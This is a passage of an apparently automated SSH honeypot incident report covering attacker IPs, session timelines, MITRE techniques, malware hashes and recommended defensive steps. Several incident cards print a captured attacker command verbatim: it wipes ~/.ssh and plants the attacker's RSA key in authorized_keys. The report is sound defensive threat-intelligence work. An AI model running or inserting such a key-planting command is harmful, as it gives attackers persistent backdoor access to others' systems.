| `2026-03-19 09:13:15` | `cowrie.session.params` |
| `2026-03-19 09:13:15` | `cowrie.command.input` |
| `2026-03-19 09:13:15` | `cowrie.command.failed` |
| `2026-03-19 09:13:16` | `cowrie.log.closed` |
| `2026-03-19 09:13:16` | `cowrie.session.params` |
| `2026-03-19 09:13:16` | `cowrie.command.input` |
| `2026-03-19 09:13:16` | `cowrie.session.file_download` |
| `2026-03-19 09:13:16` | `cowrie.log.closed` |
| `2026-03-19 09:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `161.35.87[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0c180e7f3e4

| Field | Detail |
|---|---|
| **Source IP** | `161.35.87[.]209` |
| **First Seen** | 2026-03-19 09:13 |
| **Last Seen** | 2026-03-19 09:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 09:13:22` | `cowrie.session.connect` |
| `2026-03-19 09:13:22` | `cowrie.client.version` |
| `2026-03-19 09:13:22` | `cowrie.client.kex` |
| `2026-03-19 09:13:23` | `cowrie.login.success` |
| `2026-03-19 09:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.87[.]209` to AbuseIPDB if not already reported
- [ ] Block `161.35.87[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bd5e641f638

| Field | Detail |
|---|---|
| **Source IP** | `196.29.34[.]170` |
| **First Seen** | 2026-03-19 09:37 |
| **Last Seen** | 2026-03-19 09:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 09:37:19` | `cowrie.session.connect` |
| `2026-03-19 09:37:19` | `cowrie.client.version` |
| `2026-03-19 09:37:20` | `cowrie.client.kex` |
| `2026-03-19 09:37:21` | `cowrie.login.success` |
| `2026-03-19 09:37:21` | `cowrie.session.params` |
| `2026-03-19 09:37:21` | `cowrie.command.input` |
| `2026-03-19 09:37:21` | `cowrie.command.failed` |
| `2026-03-19 09:37:22` | `cowrie.log.closed` |
| `2026-03-19 09:37:22` | `cowrie.session.params` |
| `2026-03-19 09:37:22` | `cowrie.command.input` |
| `2026-03-19 09:37:23` | `cowrie.session.file_download` |
| `2026-03-19 09:37:23` | `cowrie.log.closed` |
| `2026-03-19 09:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.29.34[.]170` to AbuseIPDB if not already reported
- [ ] Block `196.29.34[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15b179b01de6

| Field | Detail |
|---|---|
| **Source IP** | `196.29.34[.]170` |
| **First Seen** | 2026-03-19 09:37 |
| **Last Seen** | 2026-03-19 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 09:37:26` | `cowrie.session.connect` |
| `2026-03-19 09:37:26` | `cowrie.client.version` |
| `2026-03-19 09:37:27` | `cowrie.client.kex` |
| `2026-03-19 09:37:28` | `cowrie.login.success` |
| `2026-03-19 09:37:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.29.34[.]170` to AbuseIPDB if not already reported
- [ ] Block `196.29.34[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06abf24a8835

| Field | Detail |
|---|---|
| **Source IP** | `116.110.18[.]236` |
| **First Seen** | 2026-03-19 09:59 |
| **Last Seen** | 2026-03-19 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 09:59:17` | `cowrie.session.connect` |
| `2026-03-19 09:59:17` | `cowrie.client.version` |
| `2026-03-19 09:59:17` | `cowrie.client.kex` |
| `2026-03-19 09:59:18` | `cowrie.login.success` |
| `2026-03-19 09:59:18` | `cowrie.direct-tcpip.request` |
| `2026-03-19 09:59:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-03-19 09:59:18` | `cowrie.direct-tcpip.data` |
| `2026-03-19 09:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.18[.]236` to AbuseIPDB if not already reported
- [ ] Block `116.110.18[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f5c31acc57f

| Field | Detail |
|---|---|
| **Source IP** | `116.110.21[.]177` |
| **First Seen** | 2026-03-19 10:01 |
| **Last Seen** | 2026-03-19 10:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 10:01:45` | `cowrie.session.connect` |
| `2026-03-19 10:01:45` | `cowrie.client.version` |
| `2026-03-19 10:01:45` | `cowrie.client.kex` |
| `2026-03-19 10:01:46` | `cowrie.login.success` |
| `2026-03-19 10:01:46` | `cowrie.direct-tcpip.request` |
| `2026-03-19 10:01:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-03-19 10:01:46` | `cowrie.direct-tcpip.data` |
| `2026-03-19 10:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.21[.]177` to AbuseIPDB if not already reported
- [ ] Block `116.110.21[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b105b6f03e

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]127` |
| **First Seen** | 2026-03-19 10:10 |
| **Last Seen** | 2026-03-19 10:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 10:10:06` | `cowrie.session.connect` |
| `2026-03-19 10:10:06` | `cowrie.client.version` |
| `2026-03-19 10:10:07` | `cowrie.client.kex` |
| `2026-03-19 10:10:07` | `cowrie.login.success` |
| `2026-03-19 10:10:07` | `cowrie.session.params` |
| `2026-03-19 10:10:07` | `cowrie.command.input` |
| `2026-03-19 10:10:07` | `cowrie.command.failed` |
| `2026-03-19 10:10:07` | `cowrie.log.closed` |
| `2026-03-19 10:10:08` | `cowrie.session.params` |
| `2026-03-19 10:10:08` | `cowrie.command.input` |
| `2026-03-19 10:10:08` | `cowrie.session.file_download` |
| `2026-03-19 10:10:08` | `cowrie.log.closed` |
| `2026-03-19 10:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]127` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f441c0fe53

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]127` |
| **First Seen** | 2026-03-19 10:10 |
| **Last Seen** | 2026-03-19 10:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 10:10:09` | `cowrie.session.connect` |
| `2026-03-19 10:10:09` | `cowrie.client.version` |
| `2026-03-19 10:10:10` | `cowrie.client.kex` |
| `2026-03-19 10:10:10` | `cowrie.login.success` |
| `2026-03-19 10:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]127` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcfdcae8301c

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]127` |
| **First Seen** | 2026-03-19 10:12 |
| **Last Seen** | 2026-03-19 10:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 10:12:06` | `cowrie.session.connect` |
| `2026-03-19 10:12:06` | `cowrie.client.version` |
| `2026-03-19 10:12:07` | `cowrie.client.kex` |
| `2026-03-19 10:12:07` | `cowrie.login.success` |
| `2026-03-19 10:12:07` | `cowrie.session.params` |
| `2026-03-19 10:12:07` | `cowrie.command.input` |
| `2026-03-19 10:12:07` | `cowrie.command.failed` |
| `2026-03-19 10:12:07` | `cowrie.log.closed` |
| `2026-03-19 10:12:08` | `cowrie.session.params` |
| `2026-03-19 10:12:08` | `cowrie.command.input` |
| `2026-03-19 10:12:08` | `cowrie.session.file_download` |
| `2026-03-19 10:12:08` | `cowrie.log.closed` |
| `2026-03-19 10:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]127` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0eceaebfd70

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]127` |
| **First Seen** | 2026-03-19 10:12 |
| **Last Seen** | 2026-03-19 10:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 10:12:10` | `cowrie.session.connect` |
| `2026-03-19 10:12:10` | `cowrie.client.version` |
| `2026-03-19 10:12:10` | `cowrie.client.kex` |
| `2026-03-19 10:12:10` | `cowrie.login.success` |
| `2026-03-19 10:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]127` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]127` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.248.104[.]23` | **23** | 2026-03-19 06:18 | 2026-03-19 06:23 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `118.193.39[.]127` | **16** | 2026-03-19 09:52 | 2026-03-19 10:25 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.41[.]98` | **16** | 2026-03-19 07:54 | 2026-03-19 08:06 | 24m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.122[.]186` | **15** | 2026-03-19 03:18 | 2026-03-19 03:47 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.31.103[.]129` | **15** | 2026-03-19 07:25 | 2026-03-19 08:03 | 22m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.127.40[.]41` | **10** | 2026-03-19 05:47 | 2026-03-19 06:12 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.99.102[.]20` | **10** | 2026-03-19 05:49 | 2026-03-19 06:11 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `38.250.116[.]128` | **5** | 2026-03-19 00:53 | 2026-03-19 00:58 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.132.19[.]15` | **5** | 2026-03-19 02:13 | 2026-03-19 02:32 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.118[.]203` | **4** | 2026-03-19 03:49 | 2026-03-19 03:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.73.196[.]76` | **3** | 2026-03-19 10:01 | 2026-03-19 10:03 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.110.18[.]236` | **3** | 2026-03-19 09:59 | 2026-03-19 10:01 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `116.110.21[.]177` | **3** | 2026-03-19 09:57 | 2026-03-19 10:00 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `13.59.120[.]77` | **3** | 2026-03-19 00:05 | 2026-03-19 00:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `156.236.75[.]188` | **2** | 2026-03-19 08:12 | 2026-03-19 08:16 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `161.35.87[.]209` | **2** | 2026-03-19 09:07 | 2026-03-19 09:11 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.15[.]43` | **2** | 2026-03-19 06:25 | 2026-03-19 06:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.220.119[.]116` | 1 | 2026-03-19 04:13 | 2026-03-19 04:13 | 30s | 0 | `T1592` | 🟢 LOW |
| `101.126.67[.]70` | 1 | 2026-03-19 09:54 | 2026-03-19 09:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.205.237[.]2` | 1 | 2026-03-19 05:52 | 2026-03-19 05:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.120.227[.]88` | 1 | 2026-03-19 07:25 | 2026-03-19 07:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.70.39[.]216` | 1 | 2026-03-19 02:03 | 2026-03-19 02:03 | 15s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.124.96[.]19` | 1 | 2026-03-19 00:15 | 2026-03-19 00:15 | 30s | 0 | `T1592` | 🟢 LOW |
| `112.161.26[.]125` | 1 | 2026-03-19 09:49 | 2026-03-19 09:49 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.168.71[.]109` | 1 | 2026-03-19 03:22 | 2026-03-19 03:22 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.66.135[.]183` | 1 | 2026-03-19 05:50 | 2026-03-19 05:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.219.244[.]16` | 1 | 2026-03-19 05:48 | 2026-03-19 05:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.99.127[.]122` | 1 | 2026-03-19 09:23 | 2026-03-19 09:23 | 2s | 0 | `T1592` | 🟢 LOW |
| `118.183.180[.]108` | 1 | 2026-03-19 03:20 | 2026-03-19 03:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.237.27[.]185` | 1 | 2026-03-19 06:55 | 2026-03-19 06:55 | 30s | 0 | `T1592` | 🟢 LOW |
| `120.48.109[.]59` | 1 | 2026-03-19 06:56 | 2026-03-19 06:56 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.15[.]138` | 1 | 2026-03-19 09:54 | 2026-03-19 09:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.60[.]44` | 1 | 2026-03-19 09:57 | 2026-03-19 09:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.164.135[.]251` | 1 | 2026-03-19 09:10 | 2026-03-19 09:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.189.198[.]60` | 1 | 2026-03-19 03:43 | 2026-03-19 03:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.202.138[.]181` | 1 | 2026-03-19 02:22 | 2026-03-19 02:22 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.167.20[.]113` | 1 | 2026-03-19 03:59 | 2026-03-19 03:59 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `134.209.86[.]24` | 1 | 2026-03-19 04:24 | 2026-03-19 04:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `157.245.243[.]118` | 1 | 2026-03-19 00:12 | 2026-03-19 00:12 | 2s | 0 | `T1592` | 🟢 LOW |
| `179.185.18[.]67` | 1 | 2026-03-19 03:01 | 2026-03-19 03:01 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.231.67[.]114` | 1 | 2026-03-19 09:04 | 2026-03-19 09:04 | 31s | 0 | `T1592` | 🟢 LOW |
| `180.76.100[.]110` | 1 | 2026-03-19 03:19 | 2026-03-19 03:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.141[.]1` | 1 | 2026-03-19 07:32 | 2026-03-19 07:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.76.36[.]62` | 1 | 2026-03-19 06:17 | 2026-03-19 06:17 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.151[.]101` | 1 | 2026-03-19 06:42 | 2026-03-19 06:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.47[.]32` | 1 | 2026-03-19 09:57 | 2026-03-19 09:57 | 9s | 0 | `T1592` | 🟢 LOW |
| `183.171.60[.]82` | 1 | 2026-03-19 10:28 | 2026-03-19 10:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]218` | 1 | 2026-03-19 07:00 | 2026-03-19 07:00 | 21s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.207.186[.]22` | 1 | 2026-03-19 09:06 | 2026-03-19 09:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.239.20[.]236` | 1 | 2026-03-19 07:56 | 2026-03-19 07:57 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.89.208[.]174` | 1 | 2026-03-19 09:29 | 2026-03-19 09:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.148.187[.]172` | 1 | 2026-03-19 01:44 | 2026-03-19 01:44 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.201.54[.]90` | 1 | 2026-03-19 09:57 | 2026-03-19 09:57 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.102.32[.]132` | 1 | 2026-03-19 09:38 | 2026-03-19 09:39 | 12s | 0 | `T1592` | 🟢 LOW |
| `189.120.240[.]60` | 1 | 2026-03-19 00:14 | 2026-03-19 00:14 | 31s | 0 | `T1592` | 🟢 LOW |
| `196.29.34[.]170` | 1 | 2026-03-19 09:37 | 2026-03-19 09:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.242.170[.]10` | 1 | 2026-03-19 04:59 | 2026-03-19 04:59 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.251.193[.]6` | 1 | 2026-03-19 05:18 | 2026-03-19 05:18 | 7s | 0 | `T1592` | 🟢 LOW |
| `20.161.44[.]224` | 1 | 2026-03-19 08:39 | 2026-03-19 08:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.106.49[.]149` | 1 | 2026-03-19 10:35 | 2026-03-19 10:35 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `203.193.147[.]75` | 1 | 2026-03-19 10:12 | 2026-03-19 10:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.33.204[.]130` | 1 | 2026-03-19 09:37 | 2026-03-19 09:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.200.9[.]182` | 1 | 2026-03-19 06:21 | 2026-03-19 06:21 | 4s | 0 | `T1592` | 🟢 LOW |
| `220.246.66[.]209` | 1 | 2026-03-19 04:19 | 2026-03-19 04:19 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.146.248[.]7` | 1 | 2026-03-19 00:07 | 2026-03-19 00:07 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.178.227[.]0` | 1 | 2026-03-19 01:28 | 2026-03-19 01:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `50.223.176[.]171` | 1 | 2026-03-19 02:42 | 2026-03-19 02:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.115.53[.]172` | 1 | 2026-03-19 10:08 | 2026-03-19 10:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.240.156[.]16` | 1 | 2026-03-19 05:48 | 2026-03-19 05:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.185[.]185` | 1 | 2026-03-19 02:45 | 2026-03-19 02:46 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `70.91.135[.]181` | 1 | 2026-03-19 02:42 | 2026-03-19 02:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `71.12.241[.]225` | 1 | 2026-03-19 08:11 | 2026-03-19 08:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `77.37.179[.]158` | 1 | 2026-03-19 01:04 | 2026-03-19 01:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.197.6[.]173` | 1 | 2026-03-19 05:21 | 2026-03-19 05:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-03-19 09:15 | 2026-03-19 09:15 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.19.195[.]12` | 1 | 2026-03-19 08:37 | 2026-03-19 08:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.145.118[.]40` | 1 | 2026-03-19 03:24 | 2026-03-19 03:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.239.20[.]236` | CN | China Mobile Communications Corporation | **100** ⚠️ | 11 |
| `111.70.39[.]216` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 21 |
| `38.250.116[.]128` | PE | YACHAY TELECOMUNICACIONES SAC | **100** ⚠️ | 6 |
| `161.35.87[.]209` | NL | DigitalOcean, LLC | **100** ⚠️ | 18 |
| `157.245.243[.]118` | US | DigitalOcean, LLC | **100** ⚠️ | 17 |
| `121.202.138[.]181` | HK | SmarTone Mobile Communications Ltd | **100** ⚠️ | 50 |
| `118.99.102[.]20` | ID | BIZNET PREPAID | **100** ⚠️ | 11 |
| `189.120.240[.]60` | BR | Claro NXT Telecomunicacoes Ltda | **100** ⚠️ | 22 |
| `156.236.75[.]188` | JP | Yisu Cloud Ltd | **100** ⚠️ | 50 |
| `1.220.119[.]116` | KR | LG DACOM Corporation | **100** ⚠️ | 41 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 184 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 110 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 33 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |
